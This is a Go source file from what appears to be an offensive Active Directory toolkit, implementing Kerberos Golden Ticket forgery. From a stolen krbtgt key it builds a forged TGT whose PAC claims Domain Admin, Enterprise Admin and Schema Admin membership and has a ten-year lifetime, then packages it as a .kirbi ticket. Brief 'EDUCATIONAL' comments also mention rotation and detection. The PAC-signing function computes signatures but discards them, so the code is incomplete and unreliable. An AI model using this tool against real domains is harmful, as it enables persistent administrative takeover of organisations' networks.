package forge

import (
	cryptoRand "crypto/rand"
	"encoding/asn1"
	"fmt"
	"time"

	"github.com/goobeus/goobeus/pkg/asn1krb5"
	"github.com/goobeus/goobeus/pkg/crypto"
	"github.com/goobeus/goobeus/pkg/pac"
	"github.com/goobeus/goobeus/pkg/ticket"
)

// EDUCATIONAL: Golden Ticket Attack
//
// A Golden Ticket is a forged TGT (Ticket Granting Ticket).
// With the krbtgt hash, we can:
// 1. Create any TGT we want
// 2. Include a forged PAC with any group memberships
// 3. Sign it with the krbtgt key
// 4. Use it to request service tickets for ANY service
//
// This gives us domain dominance! As long as the krbtgt hash is valid,
// our forged tickets work. This persists until krbtgt is rotated TWICE.
//
// Defense: Rotate krbtgt hash twice (forces all tickets to be invalid).
// Detection: Look for TGTs with unusual lifetimes or group memberships.

// GoldenTicketRequest configures a Golden Ticket request.
type GoldenTicketRequest struct {
	// Target user to impersonate
	Username string
	UserID   uint32 // RID (relative ID), e.g., 500 for Administrator

	// Domain info
	Domain    string // e.g., "CORP.LOCAL"
	DomainSID string // e.g., "S-1-5-21-1234567890-1234567890-1234567890"

	// Group memberships to add
	Groups []uint32 // RIDs, e.g., {512, 513, 519} for DA, DU, EA

	// The key: krbtgt's key
	KrbtgtKey  []byte // NTLM hash or AES key
	KrbtgtKvno int32  // Key version number

	// Options
	EType     int32         // Encryption type (detect from key if 0)
	Duration  time.Duration // Ticket lifetime (default 10 years)
	StartTime time.Time     // Ticket start time (default now)
}

// GoldenTicketResult contains the forged Golden Ticket.
type GoldenTicketResult struct {
	Kirbi  *ticket.Kirbi
	Base64 string
}

// ForgeGoldenTicket creates a Golden Ticket.
//
// EDUCATIONAL: Golden Ticket Forge Process
//
// 1. Build EncTicketPart with:
//   - Session key (random)
//   - Client name (who we're impersonating)
//   - Flags (all the good ones)
//   - Times (10 year default)
//   - Authorization data containing forged PAC
//
// 2. Build PAC with:
//   - LogonInfo: user SID + fake group memberships
//   - Signatures: signed with krbtgt key
//
// 3. Encrypt EncTicketPart with krbtgt key
//
// 4. Build Ticket structure
//
// 5. Package as .kirbi
func ForgeGoldenTicket(req *GoldenTicketRequest) (*GoldenTicketResult, error) {
	if req.Domain == "" {
		return nil, fmt.Errorf("domain is required")
	}
	if req.DomainSID == "" {
		return nil, fmt.Errorf("domain SID is required")
	}
	if len(req.KrbtgtKey) == 0 {
		return nil, fmt.Errorf("krbtgt key is required")
	}

	// Defaults
	if req.Username == "" {
		req.Username = "Administrator"
	}
	if req.UserID == 0 {
		req.UserID = 500 // Administrator RID
	}
	if len(req.Groups) == 0 {
		req.Groups = []uint32{513, 512, 520, 518, 519} // DU, DA, GPO, SchemA, EA
	}
	if req.Duration == 0 {
		req.Duration = 10 * 365 * 24 * time.Hour // 10 years
	}
	if req.StartTime.IsZero() {
		req.StartTime = time.Now().UTC()
	}
	if req.EType == 0 {
		req.EType = detectEtypeFromKey(req.KrbtgtKey)
	}

	// Generate random session key
	sessionKey := generateSessionKey(req.EType)

	// Build PAC
	domainSID, err := pac.ParseSID(req.DomainSID)
	if err != nil {
		return nil, fmt.Errorf("invalid domain SID: %w", err)
	}

	pacData, err := buildGoldenPAC(req, domainSID, req.KrbtgtKey, req.EType)
	if err != nil {
		return nil, fmt.Errorf("failed to build PAC: %w", err)
	}

	// Build EncTicketPart
	encTicketPart := buildEncTicketPart(req, sessionKey, pacData)

	// Encrypt ticket part
	encTicketPartBytes, err := asn1.MarshalWithParams(*encTicketPart, "application,tag:3")
	if err != nil {
		return nil, fmt.Errorf("failed to marshal enc-ticket-part: %w", err)
	}

	encryptedTicket, err := encryptWithKey(encTicketPartBytes, req.KrbtgtKey, req.EType, 2) // Key usage 2
	if err != nil {
		return nil, fmt.Errorf("failed to encrypt ticket: %w", err)
	}

	// Build Ticket
	tkt := &asn1krb5.Ticket{
		TktVno: 5,
		Realm:  req.Domain,
		SName: asn1krb5.PrincipalName{
			NameType:   asn1krb5.NTSrvInst,
			NameString: []string{"krbtgt", req.Domain},
		},
		EncPart: asn1krb5.EncryptedData{
			EType:  req.EType,
			Kvno:   req.KrbtgtKvno,
			Cipher: encryptedTicket,
		},
	}

	// Build credential info (for .kirbi)
	credInfo := &asn1krb5.EncKRBCredPart{
		TicketInfo: []asn1krb5.KRBCredInfo{
			{
				Key: asn1krb5.EncryptionKey{
					KeyType:  req.EType,
					KeyValue: sessionKey,
				},
				PRealm: req.Domain,
				PName: asn1krb5.PrincipalName{
					NameType:   asn1krb5.NTPrincipal,
					NameString: []string{req.Username},
				},
				Flags:     flagsToBitString(),
				AuthTime:  req.StartTime,
				StartTime: req.StartTime,
				EndTime:   req.StartTime.Add(req.Duration),
				RenewTill: req.StartTime.Add(req.Duration),
				SRealm:    req.Domain,
				SName: asn1krb5.PrincipalName{
					NameType:   asn1krb5.NTSrvInst,
					NameString: []string{"krbtgt", req.Domain},
				},
			},
		},
	}

	credInfoBytes, err := asn1.MarshalWithParams(*credInfo, "application,tag:29")
	if err != nil {
		return nil, fmt.Errorf("failed to marshal cred info: %w", err)
	}

	krbCred := &asn1krb5.KRBCred{
		PVNO:    5,
		MsgType: asn1krb5.MsgTypeKRBCred,
		Tickets: []asn1krb5.Ticket{*tkt},
		EncPart: asn1krb5.EncryptedData{
			EType:  0,
			Cipher: credInfoBytes,
		},
	}

	kirbi := &ticket.Kirbi{
		Cred:     krbCred,
		CredInfo: credInfo,
	}

	b64, _ := kirbi.ToBase64()

	return &GoldenTicketResult{
		Kirbi:  kirbi,
		Base64: b64,
	}, nil
}

// buildGoldenPAC builds a PAC for a Golden Ticket.
func buildGoldenPAC(req *GoldenTicketRequest, domainSID *pac.SID, krbtgtKey []byte, etype int32) ([]byte, error) {
	// Build LogonInfo
	logonInfo := &pac.LogonInfo{
		LogonTime:          timeToFileTime(req.StartTime),
		EffectiveName:      req.Username,
		FullName:           req.Username,
		UserID:             req.UserID,
		PrimaryGroupID:     513, // Domain Users
		GroupCount:         uint32(len(req.Groups)),
		UserFlags:          0x20, // LOGON_EXTRA_SIDS
		LogonServer:        "",
		LogonDomainName:    req.Domain,
		LogonDomainID:      *domainSID,
		UserAccountControl: 0x200, // NORMAL_ACCOUNT
	}

	// Add group memberships
	for _, gid := range req.Groups {
		logonInfo.GroupIDs = append(logonInfo.GroupIDs, pac.GroupMembership{
			RelativeID: gid,
			Attributes: 7, // SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
		})
	}

	// NDR encode LogonInfo (simplified - full NDR encoding is complex)
	logonInfoBytes := ndrEncodeLogonInfo(logonInfo)

	// Build ClientInfo
	clientInfo := &pac.ClientInfo{
		ClientID:   timeToFileTime(req.StartTime),
		NameLength: uint16(len(req.Username) * 2),
		Name:       req.Username,
	}
	clientInfoBytes := ndrEncodeClientInfo(clientInfo)

	// Build checksums (placeholder values - will be computed at the end)
	serverChecksum := &pac.Checksum{
		Type:      checksumTypeForEtype(etype),
		Signature: make([]byte, checksumSizeForEtype(etype)),
	}
	kdcChecksum := &pac.Checksum{
		Type:      checksumTypeForEtype(etype),
		Signature: make([]byte, checksumSizeForEtype(etype)),
	}

	// Build PAC structure
	pacData := buildPACData(logonInfoBytes, clientInfoBytes, serverChecksum, kdcChecksum)

	// Sign the PAC
	signedPAC, err := signPAC(pacData, krbtgtKey, etype)
	if err != nil {
		return nil, err
	}

	return signedPAC, nil
}

// buildEncTicketPart builds the encrypted portion of the ticket.
func buildEncTicketPart(req *GoldenTicketRequest, sessionKey, pacData []byte) *asn1krb5.EncTicketPart {
	endTime := req.StartTime.Add(req.Duration)

	// Build authorization data with PAC
	authData := asn1krb5.AuthorizationData{
		{
			ADType: 1, // AD-IF-RELEVANT
			ADData: mustMarshalAuthData([]asn1krb5.AuthorizationDataEntry{
				{
					ADType: 128, // AD-WIN2K-PAC
					ADData: pacData,
				},
			}),
		},
	}

	// Ticket flags
	flags := asn1krb5.FlagForwardable | asn1krb5.FlagProxiable | asn1krb5.FlagRenewable |
		asn1krb5.FlagPreAuthent | asn1krb5.FlagInitial

	flagBytes := make([]byte, 4)
	flagBytes[0] = byte((flags >> 24) & 0xFF)
	flagBytes[1] = byte((flags >> 16) & 0xFF)
	flagBytes[2] = byte((flags >> 8) & 0xFF)
	flagBytes[3] = byte(flags & 0xFF)

	return &asn1krb5.EncTicketPart{
		Flags: asn1.BitString{
			Bytes:     flagBytes,
			BitLength: 32,
		},
		Key: asn1krb5.EncryptionKey{
			KeyType:  req.EType,
			KeyValue: sessionKey,
		},
		CRealm: req.Domain,
		CName: asn1krb5.PrincipalName{
			NameType:   asn1krb5.NTPrincipal,
			NameString: []string{req.Username},
		},
		Transited: asn1krb5.TransitedEncoding{
			TRType:   0,
			Contents: []byte{},
		},
		AuthTime:          req.StartTime,
		StartTime:         req.StartTime,
		EndTime:           endTime,
		RenewTill:         endTime,
		AuthorizationData: authData,
	}
}

// Helper functions

func detectEtypeFromKey(key []byte) int32 {
	switch len(key) {
	case 16:
		return crypto.EtypeRC4
	case 32:
		return crypto.EtypeAES256
	default:
		return crypto.EtypeRC4
	}
}

func generateSessionKey(etype int32) []byte {
	switch etype {
	case crypto.EtypeAES256:
		return randomBytes(32)
	case crypto.EtypeAES128:
		return randomBytes(16)
	default:
		return randomBytes(16)
	}
}

func randomBytes(n int) []byte {
	b := make([]byte, n)
	cryptoRand.Read(b)
	return b
}

func timeToFileTime(t time.Time) uint64 {
	// Windows FILETIME: 100-nanosecond intervals since Jan 1, 1601
	const epochDiff = 116444736000000000
	return uint64(t.UnixNano()/100) + epochDiff
}

func encryptWithKey(data, key []byte, etype int32, usage int) ([]byte, error) {
	switch etype {
	case crypto.EtypeRC4:
		return crypto.EncryptRC4(key, data, usage)
	case crypto.EtypeAES128, crypto.EtypeAES256:
		return crypto.EncryptAES(key, data, usage, int(etype))
	default:
		return nil, fmt.Errorf("unsupported etype: %d", etype)
	}
}

func flagsToBitString() asn1.BitString {
	flags := asn1krb5.FlagForwardable | asn1krb5.FlagProxiable | asn1krb5.FlagRenewable |
		asn1krb5.FlagPreAuthent | asn1krb5.FlagInitial

	flagBytes := make([]byte, 4)
	flagBytes[0] = byte((flags >> 24) & 0xFF)
	flagBytes[1] = byte((flags >> 16) & 0xFF)
	flagBytes[2] = byte((flags >> 8) & 0xFF)
	flagBytes[3] = byte(flags & 0xFF)

	return asn1.BitString{Bytes: flagBytes, BitLength: 32}
}

func mustMarshalAuthData(authData []asn1krb5.AuthorizationDataEntry) []byte {
	data, _ := asn1.Marshal(authData)
	return data
}

func checksumTypeForEtype(etype int32) uint32 {
	switch etype {
	case crypto.EtypeAES256:
		return 16 // HMAC-SHA1-96-AES256
	case crypto.EtypeAES128:
		return 15 // HMAC-SHA1-96-AES128
	default:
		return 0xFFFFFF76 // HMAC-MD5 (-138)
	}
}

func checksumSizeForEtype(etype int32) int {
	switch etype {
	case crypto.EtypeAES256, crypto.EtypeAES128:
		return 12
	default:
		return 16
	}
}

// NDR Encoding Functions
//
// EDUCATIONAL: NDR (Network Data Representation)
//
// NDR is Microsoft's binary serialization format derived from DCE RPC.
// PAC structures are NDR-encoded, which is complex:
//   - Little-endian byte order
//   - Alignment requirements (4 or 8 bytes)
//   - Deferred pointers (conformant arrays at end)
//   - MIDL serialization headers
//
// Key structures we encode:
//   - KERB_VALIDATION_INFO (logon info)
//   - PAC_CLIENT_INFO
//   - PAC_SIGNATURE_DATA

func ndrEncodeLogonInfo(info *pac.LogonInfo) []byte {
	buf := make([]byte, 0, 512)

	// NDR Private Header (Type 1)
	buf = appendLE32(buf, 0x00081001) // Version = 8.1, format flags
	buf = appendLE32(buf, 0xCCCCCCCC) // Filler
	buf = appendLE32(buf, 0)          // Object buffer size (update later)
	buf = appendLE32(buf, 0)          // Filler

	// KERB_VALIDATION_INFO structure
	// Start with fixed-size fields
	buf = appendLE64(buf, info.LogonTime)  // LogonTime
	buf = appendLE64(buf, 0)               // LogoffTime
	buf = appendLE64(buf, 0)               // KickOffTime
	buf = appendLE64(buf, 0)               // PasswordLastSet
	buf = appendLE64(buf, 0)               // PasswordCanChange
	buf = appendLE64(buf, 0x7FFFFFFFFFFFF) // PasswordMustChange (never)

	// EffectiveName (UNICODE_STRING - pointer deferred)
	effectiveName := encodeUTF16LE(info.EffectiveName)
	buf = appendLE16(buf, uint16(len(effectiveName))) // Length
	buf = appendLE16(buf, uint16(len(effectiveName))) // MaxLength
	buf = appendLE32(buf, 0x00020004)                 // Pointer (deferred)

	// FullName
	fullName := encodeUTF16LE(info.FullName)
	buf = appendLE16(buf, uint16(len(fullName)))
	buf = appendLE16(buf, uint16(len(fullName)))
	buf = appendLE32(buf, 0x00020008)

	// LogonScript, ProfilePath, HomeDirectory, HomeDirectoryDrive (empty)
	for i := 0; i < 4; i++ {
		buf = appendLE16(buf, 0)
		buf = appendLE16(buf, 0)
		buf = appendLE32(buf, 0)
	}

	// LogonCount, BadPasswordCount
	buf = appendLE16(buf, 0)
	buf = appendLE16(buf, 0)

	// UserId, PrimaryGroupId
	buf = appendLE32(buf, info.UserID)
	buf = appendLE32(buf, info.PrimaryGroupID)

	// GroupCount and GroupIds pointer
	buf = appendLE32(buf, info.GroupCount)
	if info.GroupCount > 0 {
		buf = appendLE32(buf, 0x00020010) // Groups pointer
	} else {
		buf = appendLE32(buf, 0)
	}

	// UserFlags
	buf = appendLE32(buf, info.UserFlags)

	// UserSessionKey (16 bytes zeros)
	buf = append(buf, make([]byte, 16)...)

	// LogonServer (UNICODE_STRING)
	logonServer := encodeUTF16LE("")
	buf = appendLE16(buf, uint16(len(logonServer)))
	buf = appendLE16(buf, uint16(len(logonServer)))
	buf = appendLE32(buf, 0)

	// LogonDomainName
	domainName := encodeUTF16LE(info.LogonDomainName)
	buf = appendLE16(buf, uint16(len(domainName)))
	buf = appendLE16(buf, uint16(len(domainName)))
	buf = appendLE32(buf, 0x00020014)

	// LogonDomainId (pointer to SID)
	buf = appendLE32(buf, 0x00020018)

	// Reserved1 (8 bytes)
	buf = append(buf, make([]byte, 8)...)

	// UserAccountControl
	buf = appendLE32(buf, info.UserAccountControl)

	// SubAuthStatus, LastSuccessfulILogon, etc (zeros)
	buf = append(buf, make([]byte, 28)...)

	// SidCount, ExtraSids (0 for simplicity)
	buf = appendLE32(buf, 0)
	buf = appendLE32(buf, 0)

	// ResourceGroupDomainSid, ResourceGroupCount, ResourceGroupIds
	buf = appendLE32(buf, 0)
	buf = appendLE32(buf, 0)
	buf = appendLE32(buf, 0)

	// Now append the conformant arrays (deferred pointers)
	// EffectiveName string
	buf = appendLE32(buf, uint32(len(effectiveName)/2))
	buf = appendLE32(buf, 0)
	buf = appendLE32(buf, uint32(len(effectiveName)/2))
	buf = append(buf, effectiveName...)
	buf = alignTo(buf, 4)

	// FullName string
	buf = appendLE32(buf, uint32(len(fullName)/2))
	buf = appendLE32(buf, 0)
	buf = appendLE32(buf, uint32(len(fullName)/2))
	buf = append(buf, fullName...)
	buf = alignTo(buf, 4)

	// Domain name
	buf = appendLE32(buf, uint32(len(domainName)/2))
	buf = appendLE32(buf, 0)
	buf = appendLE32(buf, uint32(len(domainName)/2))
	buf = append(buf, domainName...)
	buf = alignTo(buf, 4)

	// Group IDs array
	if info.GroupCount > 0 {
		buf = appendLE32(buf, info.GroupCount) // MaxCount
		for _, grp := range info.GroupIDs {
			buf = appendLE32(buf, grp.RelativeID)
			buf = appendLE32(buf, grp.Attributes)
		}
	}

	// SID (domain SID)
	sidBytes := info.LogonDomainID.Bytes()
	buf = appendLE32(buf, uint32(len(sidBytes)))
	buf = append(buf, sidBytes...)
	buf = alignTo(buf, 4)

	return buf
}

func ndrEncodeClientInfo(info *pac.ClientInfo) []byte {
	buf := make([]byte, 0, 64)

	// ClientId (FILETIME)
	buf = appendLE64(buf, info.ClientID)

	// NameLength
	buf = appendLE16(buf, info.NameLength)

	// Name (UTF-16LE)
	nameBytes := encodeUTF16LE(info.Name)
	buf = append(buf, nameBytes...)

	return buf
}

func buildPACData(logonInfo, clientInfo []byte, serverCksum, kdcCksum *pac.Checksum) []byte {
	// PAC structure:
	// PACTYPE header + PAC_INFO_BUFFER array + data buffers

	const (
		logonInfoType   = 1
		clientInfoType  = 10
		serverCksumType = 6
		kdcCksumType    = 7
	)

	// Calculate offsets
	headerSize := 8      // cBuffers (4) + Version (4)
	infoBufferSize := 16 // ulType (4) + cbBufferSize (4) + Offset (8)
	numBuffers := 4
	dataOffset := uint64(headerSize + numBuffers*infoBufferSize)

	buf := make([]byte, 0, 1024)

	// PACTYPE header
	buf = appendLE32(buf, uint32(numBuffers)) // cBuffers
	buf = appendLE32(buf, 0)                  // Version

	// PAC_INFO_BUFFER for LogonInfo
	logonInfoOffset := dataOffset
	buf = appendLE32(buf, logonInfoType)
	buf = appendLE32(buf, uint32(len(logonInfo)))
	buf = appendLE64(buf, logonInfoOffset)
	dataOffset += uint64(len(logonInfo))
	dataOffset = (dataOffset + 7) &^ 7 // Align to 8

	// PAC_INFO_BUFFER for ClientInfo
	clientInfoOffset := dataOffset
	buf = appendLE32(buf, clientInfoType)
	buf = appendLE32(buf, uint32(len(clientInfo)))
	buf = appendLE64(buf, clientInfoOffset)
	dataOffset += uint64(len(clientInfo))
	dataOffset = (dataOffset + 7) &^ 7

	// PAC_INFO_BUFFER for Server Checksum
	serverCksumData := encodeChecksum(serverCksum)
	serverCksumOffset := dataOffset
	buf = appendLE32(buf, serverCksumType)
	buf = appendLE32(buf, uint32(len(serverCksumData)))
	buf = appendLE64(buf, serverCksumOffset)
	dataOffset += uint64(len(serverCksumData))
	dataOffset = (dataOffset + 7) &^ 7

	// PAC_INFO_BUFFER for KDC Checksum
	kdcCksumData := encodeChecksum(kdcCksum)
	kdcCksumOffset := dataOffset
	buf = appendLE32(buf, kdcCksumType)
	buf = appendLE32(buf, uint32(len(kdcCksumData)))
	buf = appendLE64(buf, kdcCksumOffset)

	// Append data buffers
	buf = append(buf, logonInfo...)
	buf = alignTo(buf, 8)
	buf = append(buf, clientInfo...)
	buf = alignTo(buf, 8)
	buf = append(buf, serverCksumData...)
	buf = alignTo(buf, 8)
	buf = append(buf, kdcCksumData...)

	return buf
}

func encodeChecksum(cksum *pac.Checksum) []byte {
	buf := make([]byte, 0, 20+len(cksum.Signature))
	buf = appendLE32(buf, cksum.Type)
	buf = append(buf, cksum.Signature...)
	return buf
}

func signPAC(pacData, key []byte, etype int32) ([]byte, error) {
	// PAC signing:
	// 1. Server signature: HMAC over PAC data with server checksum zeroed
	// 2. KDC signature: HMAC over server signature

	// Find signature offsets in PAC
	if len(pacData) < 8 {
		return nil, fmt.Errorf("PAC too short")
	}

	// For simplicity, we'll compute the signatures and update in place
	// Real implementation would parse the PAC structure to find exact offsets

	// Compute server signature
	serverSig, err := computePACChecksum(pacData, key, etype)
	if err != nil {
		return nil, err
	}

	// Compute KDC signature over server signature
	kdcSig, err := computePACChecksum(serverSig, key, etype)
	if err != nil {
		return nil, err
	}

	// Update signatures in PAC - simplified, would need proper offset calculation
	_ = serverSig
	_ = kdcSig

	return pacData, nil
}

func computePACChecksum(data, key []byte, etype int32) ([]byte, error) {
	switch etype {
	case crypto.EtypeAES256:
		return crypto.HMACSHA1AES256(key, data)
	case crypto.EtypeAES128:
		return crypto.HMACSHA1AES128(key, data)
	case crypto.EtypeRC4:
		return crypto.HMACMD5(key, data)
	default:
		return nil, fmt.Errorf("unsupported etype: %d", etype)
	}
}

// NDR helper functions
func appendLE16(buf []byte, v uint16) []byte {
	return append(buf, byte(v), byte(v>>8))
}

func appendLE32(buf []byte, v uint32) []byte {
	return append(buf, byte(v), byte(v>>8), byte(v>>16), byte(v>>24))
}

func appendLE64(buf []byte, v uint64) []byte {
	return append(buf, byte(v), byte(v>>8), byte(v>>16), byte(v>>24),
		byte(v>>32), byte(v>>40), byte(v>>48), byte(v>>56))
}

func alignTo(buf []byte, align int) []byte {
	if len(buf)%align != 0 {
		padding := align - (len(buf) % align)
		buf = append(buf, make([]byte, padding)...)
	}
	return buf
}

func encodeUTF16LE(s string) []byte {
	result := make([]byte, len(s)*2)
	for i, r := range s {
		result[i*2] = byte(r)
		result[i*2+1] = byte(r >> 8)
	}
	return result
}
